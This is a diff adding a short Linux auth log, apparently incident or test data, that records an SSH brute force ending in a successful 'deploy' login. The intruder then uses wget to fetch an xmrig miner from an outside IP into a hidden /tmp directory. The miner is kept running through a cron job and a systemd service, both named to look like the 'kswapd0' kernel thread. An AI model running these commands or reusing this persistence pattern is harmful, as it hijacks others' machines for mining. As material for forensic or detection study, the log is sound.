@@ -1,0 +1,37 @@
+Oct  2 03:14:05 build03 sshd[4100]: Failed password for deploy from 203.0.113.77 port 50100 ssh2
+Oct  2 03:14:09 build03 sshd[4101]: Failed password for ubuntu from 203.0.113.77 port 50103 ssh2
+Oct  2 03:14:13 build03 sshd[4102]: Failed password for admin from 203.0.113.77 port 50106 ssh2
+Oct  2 03:14:17 build03 sshd[4103]: Failed password for deploy from 203.0.113.77 port 50109 ssh2
+Oct  2 03:14:21 build03 sshd[4104]: Failed password for git from 203.0.113.77 port 50112 ssh2
+Oct  2 03:14:25 build03 sshd[4105]: Failed password for deploy from 203.0.113.77 port 50115 ssh2
+Oct  2 03:14:29 build03 sshd[4106]: Failed password for test from 203.0.113.77 port 50118 ssh2
+Oct  2 03:14:33 build03 sshd[4107]: Failed password for deploy from 203.0.113.77 port 50121 ssh2
+Oct  2 03:14:37 build03 sshd[4108]: Failed password for deploy from 203.0.113.77 port 50124 ssh2
+Oct  2 03:14:41 build03 sshd[4109]: Failed password for ubuntu from 203.0.113.77 port 50127 ssh2
+Oct  2 03:14:45 build03 sshd[4110]: Failed password for admin from 203.0.113.77 port 50130 ssh2
+Oct  2 03:14:49 build03 sshd[4111]: Failed password for deploy from 203.0.113.77 port 50133 ssh2
+Oct  2 03:14:53 build03 sshd[4112]: Failed password for git from 203.0.113.77 port 50136 ssh2
+Oct  2 03:14:57 build03 sshd[4113]: Failed password for deploy from 203.0.113.77 port 50139 ssh2
+Oct  2 03:15:01 build03 sshd[4114]: Failed password for test from 203.0.113.77 port 50142 ssh2
+Oct  2 03:15:05 build03 sshd[4115]: Failed password for deploy from 203.0.113.77 port 50145 ssh2
+Oct  2 03:15:09 build03 sshd[4116]: Failed password for deploy from 203.0.113.77 port 50148 ssh2
+Oct  2 03:15:13 build03 sshd[4117]: Failed password for ubuntu from 203.0.113.77 port 50151 ssh2
+Oct  2 03:15:17 build03 sshd[4118]: Failed password for admin from 203.0.113.77 port 50154 ssh2
+Oct  2 03:15:21 build03 sshd[4119]: Failed password for deploy from 203.0.113.77 port 50157 ssh2
+Oct  2 03:15:25 build03 sshd[4120]: Failed password for git from 203.0.113.77 port 50160 ssh2
+Oct  2 03:15:29 build03 sshd[4121]: Failed password for deploy from 203.0.113.77 port 50163 ssh2
+Oct  2 03:15:33 build03 sshd[4122]: Failed password for test from 203.0.113.77 port 50166 ssh2
+Oct  2 03:15:37 build03 sshd[4123]: Failed password for deploy from 203.0.113.77 port 50169 ssh2
+Oct  2 03:15:41 build03 sshd[4124]: Failed password for deploy from 203.0.113.77 port 50172 ssh2
+Oct  2 03:15:45 build03 sshd[4125]: Failed password for ubuntu from 203.0.113.77 port 50175 ssh2
+Oct  2 03:15:49 build03 sshd[4126]: Failed password for admin from 203.0.113.77 port 50178 ssh2
+Oct  2 03:15:53 build03 sshd[4127]: Failed password for deploy from 203.0.113.77 port 50181 ssh2
+Oct  2 03:15:57 build03 sshd[4128]: Failed password for git from 203.0.113.77 port 50184 ssh2
+Oct  2 03:16:01 build03 sshd[4129]: Failed password for deploy from 203.0.113.77 port 50187 ssh2
+Oct  2 03:16:05 build03 sshd[4130]: Failed password for test from 203.0.113.77 port 50190 ssh2
+Oct  2 03:16:09 build03 sshd[4131]: Failed password for deploy from 203.0.113.77 port 50193 ssh2
+Oct  2 03:16:43 build03 sshd[4190]: Accepted password for deploy from 203.0.113.77 port 50411 ssh2
+Oct  2 03:17:38 build03 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/x/xmrig-6.21.tar.gz -O /tmp/.cache/kx.tgz
+Oct  2 03:18:18 build03 sudo: deploy : TTY=pts/1 ; PWD=/tmp/.cache ; USER=root ; COMMAND=/usr/bin/crontab -l
+Oct  2 03:18:38 build03 crontab[4231]: (root) new cron job created: @reboot /tmp/.cache/kswapd0 -c /tmp/.cache/config.json
+Oct  2 03:18:53 build03 systemd[1]: systemctl enable kswapd0.service: Created symlink /etc/systemd/system/multi-user.target.wants/kswapd0.service
